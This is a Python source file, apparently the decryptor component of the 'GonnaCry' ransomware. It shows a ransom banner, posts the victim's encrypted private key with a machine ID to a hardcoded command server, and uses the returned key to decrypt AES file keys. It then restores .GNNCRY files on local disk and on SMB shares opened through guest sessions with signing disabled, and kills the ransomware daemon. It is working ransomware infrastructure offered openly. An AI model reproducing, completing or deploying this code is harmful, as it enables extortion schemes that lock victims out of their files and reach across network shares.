import environment
import symmetric
import utils

import subprocess
import requests
import base64
import string
import random
import sys
import time
import os
import pickle

try:
    import smbclient
    SMB_AVAILABLE = True
except ImportError:
    SMB_AVAILABLE = False

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP


logo = """
  ▄████  ▒█████   ███▄    █  ███▄    █  ▄▄▄       ▄████▄   ██▀███ ▓██   ██▓
 ██▒ ▀█▒▒██▒  ██▒ ██ ▀█   █  ██ ▀█   █ ▒████▄    ▒██▀ ▀█  ▓██ ▒ ██▒▒██  ██▒
▒██░▄▄▄░▒██░  ██▒▓██  ▀█ ██▒▓██  ▀█ ██▒▒██  ▀█▄  ▒▓█    ▄ ▓██ ░▄█ ▒ ▒██ ██░
░▓█  ██▓▒██   ██░▓██▒  ▐▌██▒▓██▒  ▐▌██▒░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒██▀▀█▄   ░ ▐██▓░
░▒▓███▀▒░ ████▓▒░▒██░   ▓██░▒██░   ▓██░ ▓█   ▓██▒▒ ▓███▀ ░░██▓ ▒██▒ ░ ██▒▓░
 ░▒   ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ░▒ ▒  ░░ ▒▓ ░▒▓░  ██▒▒▒ 
  ░   ░   ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░░   ░ ▒░  ▒   ▒▒ ░  ░  ▒     ░▒ ░ ▒░▓██ ░▒░ 
░ ░   ░ ░ ░ ░ ▒     ░   ░ ░    ░   ░ ░   ░   ▒   ░          ░░   ░ ▒ ▒ ░░  
      ░     ░ ░           ░          ░       ░  ░░ ░         ░     ░ ░     
                                                 ░                 ░ ░    
    ALL YOUR FILES ARE ENCRYPTED WITH AES-256-GCM
    YOUR COMPUTER IS INFECTED WITH MALWARE THAT ENCRYPTED ALL YOUR IMPORTANT FILES
    THE ONLY WAY TO GET THEM BACK IS WITH THIS DECRYPTOR
"""


BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', \
                                                 '\33[93m', '\033[1;35m', '\033[1;32m', \
                                                  '\033[0m'

# environment paths
ransomware_name = ("gonnacry")
server_address = "http://173.168.0.50"
home = environment.get_home_path()
desktop = environment.get_desktop_path()
username = environment.get_username()
ransomware_path = os.path.join(home, ransomware_name)
machine_id = environment.get_unique_machine_id()


def kill_daemon():
    def pidof(name):
        p = subprocess.Popen(f"pidof {name}", shell=True,
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return p.stdout.read().decode().strip()

    for pid in [pidof('daemon'), pidof('gonnacry')]:
        if pid:
            os.system(f'kill -9 {pid}')

    os.system("killall daemon 2>/dev/null")
    os.system("killall gonnacry 2>/dev/null")


def decrypt_aes_keys(enc, key):
    key_obj = RSA.importKey(key)
    cipher = PKCS1_OAEP.new(key_obj)
    return cipher.decrypt(enc)


def send_to_server_encrypted_private_key(id, private_encrypted_key):
    try:
        ret = requests.post(server_address + "/decrypt/", data=private_encrypted_key,
                            headers={"X-Machine-ID": str(id)})
    except Exception as e:
        raise e

    print("key decrypted")

    return ret.content


def payment():
    pass


def menu():
    print("{}Importing the encrypted client private key".format(WHITE))
    try:
        with open(os.path.join(ransomware_path, 'encrypted_client_private_key.key'),
                  'rb') as f:
            encrypted_client_private_key = pickle.load(f)
    except IOError:
        print("encrypted client private key not found, \
              I'm sorry. but all your files are lost!")
        sys.exit(-1)

    print("{}OK{}".format(GREEN, WHITE))

    key_to_be_sent = base64.b64encode(pickle.dumps(encrypted_client_private_key))

    # send to server to be decrypted
    while True:
        try:
            print("Requesting to server to decrypt the private key")
            client_private_key = send_to_server_encrypted_private_key(machine_id, key_to_be_sent)
            break
        except:
            print("{}No connection, sleeping for 2 minutes\nConnect \
                  to internet to get your files back!{}".format(RED, WHITE))
            time.sleep(120)

    # saving to disk the private key
    print("{}Client private key decrypted and stored to disk{}".format(GREEN, WHITE))
    with open(os.path.join(ransomware_path, "client_private_key.PEM"), 'wb') as f:
        f.write(client_private_key if isinstance(client_private_key, bytes) else client_private_key.encode('utf-8'))

    # GET THE AES KEYS and path
    try:
        with open(os.path.join(ransomware_path, "AES_encrypted_keys.txt")) as f:
            content = f.read()
    except IOError:
        print("AES keys not found. Sorry but all your files are lost!")
        sys.exit(-1)

    # get the aes keys and IV's and paths back
    print('Decrypting the files ...')
    content = content.split('\n')
    content.remove('')
    aes_and_path = []
    for line in content:
        ret = line.split(' ') # enc(KEY) base64(PATH)
        encrypted_aes_key = base64.b64decode(ret[0])
        aes_key = decrypt_aes_keys(encrypted_aes_key, client_private_key)

        aes_and_path.append((aes_key, base64.b64decode(ret[1])))

    _smb_connected = set()
    for _ in aes_and_path:
        dec = symmetric.AESCipher(_[0])
        path = _[1]

        if path.startswith(b'\\\\') and SMB_AVAILABLE:
            smb_path = path.decode('utf-8')
            ip = smb_path[2:].split('\\')[0]
            try:
                if ip not in _smb_connected:
                    smbclient.ClientConfig(require_secure_negotiate=False)
                    smbclient.register_session(ip, username='Guest', password='',
                                               auth_protocol='ntlm', require_signing=False)
                    _smb_connected.add(ip)
                with smbclient.open_file(smb_path, mode='rb') as f:
                    encrypted_file_content = f.read()
                decrypted_file_content = dec.decrypt(encrypted_file_content)
                old_smb_path = smb_path.replace('.GNNCRY', '')
                with smbclient.open_file(old_smb_path, mode='wb') as f:
                    f.write(decrypted_file_content if isinstance(decrypted_file_content, bytes)
                            else decrypted_file_content.encode('utf-8'))
                smbclient.remove(smb_path)
            except Exception:
                pass
        else:
            try:
                with open(path, 'rb') as f:
                    encrypted_file_content = f.read()
                decrypted_file_content = dec.decrypt(encrypted_file_content)
                old_file_name = path.replace(b'.GNNCRY', b'')
                with open(old_file_name, 'wb') as f:
                    f.write(decrypted_file_content if isinstance(decrypted_file_content, bytes)
                            else decrypted_file_content.encode('utf-8'))
                utils.shred(path)
            except Exception:
                pass

    # end of decryptor
    print("{}Decryption finished!{}".format(GREEN, WHITE))

    # kill deamon running on bg
    kill_daemon()


if __name__ == "__main__": 
    print(logo)
    menu()
